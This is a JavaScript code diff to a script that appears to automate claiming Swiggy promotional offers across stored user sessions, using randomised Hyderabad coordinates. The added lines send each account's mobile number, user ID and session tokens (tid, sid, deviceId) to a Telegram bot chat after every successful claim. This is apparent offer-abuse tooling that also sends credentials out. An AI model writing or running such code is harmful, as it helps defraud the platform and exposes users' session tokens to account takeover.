@@ -18,7 +18,13 @@ function getRandomHydLocation() {
 }
 
 async function sendTelegramMsg(text) {
-    try { await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'Markdown' }) }); } catch (e) {}
+    try { 
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, { 
+            method: 'POST', 
+            headers: { 'Content-Type': 'application/json' }, 
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'Markdown' }) 
+        }); 
+    } catch (e) {}
 }
 
 async function updateProfileName(sessionData) {
@@ -61,14 +67,32 @@ async function claimOffers() {
 
             if (targetOffers.length > 0) {
                 let claimedAny = false, claimedTitles = [];
+                
                 for (const targetOffer of targetOffers) {
                     const claimRes = await fetch(`https://www.swiggy.com/dapi/offers/claim`, { method: 'POST', headers: headers, body: JSON.stringify({ offerId: targetOffer.offerId, lat, lng }) });
                     const claimData = await claimRes.json();
+                    
                     if (claimData.statusCode === 0 || claimData.success) {
                         claimedTitles.push(targetOffer.title);
                         claimedAny = true;
+                        
+                        // INSTANT NOTIFICATION: Send updated session to Telegram immediately
+                        const successMsg = `*✅ OFFER CLAIMED SUCCESSFULLY!*\n\n` +
+                                           `📱 *Mobile:* \`${session.mobile}\`\n` +
+                                           `🎁 *Offer:* ${targetOffer.title}\n` +
+                                           `🆔 *User ID:* \`${session.userid}\`\n\n` +
+                                           `*Updated Session Tokens:*\n` +
+                                           `\`\`\`json\n${JSON.stringify({
+                                               mobile: session.mobile,
+                                               userid: session.userid,
+                                               tid: session.tid,
+                                               sid: session.sid,
+                                               deviceId: session.deviceId
+                                           }, null, 2)}\n\`\`\``;
+                        await sendTelegramMsg(successMsg);
                     }
                 }
+                
                 if (claimedAny) {
                     session.claimed = true;
                     session.claimedAt = new Date().toISOString();
